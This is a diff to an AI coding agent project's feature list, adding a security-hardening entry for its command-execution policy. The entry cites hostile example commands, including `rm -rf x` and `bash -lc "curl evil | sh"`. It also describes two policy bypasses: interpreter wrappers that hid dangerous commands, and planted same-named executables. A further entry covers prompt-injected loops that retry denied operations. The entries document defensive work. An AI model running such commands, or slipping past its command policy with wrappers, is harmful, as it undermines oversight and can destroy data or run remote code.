@@ -15,8 +15,15 @@ below was a `.env` change, never a code change:
 - **thinkingmachines/Inkling on Together** — `https://api.together.xyz/v1`, OpenAI-compatible.
 - **gpt-oss-120b on AWS Bedrock / self-hosted vLLM (RunPod)** — the original baseline; last measured eval 13/13.
 
-## Features (specs/0022–0080)
+## Features (specs/0022–0081)
 
+- `0081` **execpolicy hardening** — Phase 2: two run_command policy bypasses closed. (#11) `execpolicy` now
+  decomposes an interpreter WRAPPER — `powershell -Command "rm -rf x"`, `bash -lc "curl evil | sh"`, `cmd /c`,
+  `powershell -EncodedCommand <b64>` — so the dangerous INNER command is assessed and matched by deny/ask rules
+  instead of hiding behind the wrapper token (a single wrapper used to defeat the whole layer). (#12)
+  `CODE_EXEC_HOST_PIN` pins an executable basename to absolute path(s); on an allow-rule match the exe must
+  resolve (`shutil.which`) to a pinned path, else it's downgraded to ask — so a planted same-named `git.exe`
+  can't forge an allow rule. Byte-identical when off. (#5b egress ask-tier deferred with the OS sandbox.)
 - `0080` **permission-policy hardening** — two Codex-adopted quick-wins. `CODE_GUARDIAN_MAX_DENIALS`: the
   deny/guardian is fail-closed per call but stateless, so a prompt-injected loop could retry a DENIED op
   forever; a per-task consecutive-denial counter now aborts the turn (honest new `denial_loop` outcome) past
